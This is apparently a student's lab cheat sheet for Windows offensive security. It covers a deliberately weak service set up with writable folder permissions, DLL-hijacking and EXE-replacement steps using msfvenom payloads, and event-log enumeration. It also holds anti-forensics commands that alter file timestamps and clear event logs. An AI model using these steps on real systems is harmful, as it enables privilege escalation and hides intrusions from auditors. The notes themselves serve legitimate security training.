## not on CTFs but could be useful in future ##
run powershell as admin ##
net use Z: "\\https://live.sysinternals.com" /persistent:yes
#web browser http://the.earth.li/~sgtatham/putty/0.67/x86/putty.exe
mkdir "C:\Program Files (x86)\Putty"
move C:\Users\student\Desktop\putty.exe 'C:\Program Files (x86)\Putty\putty.exe'
sc.exe create puttyService binPath='C:\Program Files (x86)\Putty\putty.exe' displayname='puttyService' start=auto
icacls 'C:\Program Files (x86)\Putty' /grant BUILTIN\Users:W

## DLL Hyjacking
look for services that arent system made
double click and see if the file path has sn .exe in it
see if you can add a file to the directory where the .exe is 
open powershell 
cd to file path foudn in services 
open procmon add :
  process name - value: <process name>
  result- value: NAME NOT FOUND
  Path- value: <pathf rom services>
run applications see out put for vulnerable .dll
go to lin-ops create msfvenom script for payload 
msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\desktop\whoami.txt' -f dll > <dll name>.dll
scp payload file into directory of vulnerable dll
execute .exe to exploit
view txt created for whoami cmd

## EXE replacement 
same steps as above till "find vuln dll"
lin-ops msfvenom 
msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\desktop\whoami.txt' -f exe > putty.exe
run .exe and view whoami.txt 

## Audit logging ##
auditpol /get /category:*
auditpol /get /category:* | findstr /i "success failure"

## important log numbers
Successful/failed login          4624/4625
Account created                  4720
Administrative user logged on    4672
Service created                  7045
 ## event Logging 
wevtutil el
wmic ntevent where "logfile="<LOGNAME>" list full
Get-Eventlog -List

## powershell logging
#PS version
reg query hklm\software\microsoft\powershell\3\powershellengine\
powershell -command "$psversiontable"
#if logging is set
reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell
reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
# 0 = no | 1 = errors | 2 = verbose
# WMIC log storage
%systemroot%\system32\wbem\Logs\
# find files and alter files attribs
forfiles /P c:\windows\system32 /S /D +05/14/2019
wmic datafile where name='c:\\windows\\system32\\notepad.exe' get CreationDate, LastAccessed, LastModified
copy /b filename.ext +,,
$(Get-Item file.ext).lastaccesstime=$(date) |$(Get-Item test.txt).lastaccesstime=$(Get-Date "07/07/2004")

#clear Event logs 
wevtutil clear-log Application
Clear-Eventlog -Log Application, System

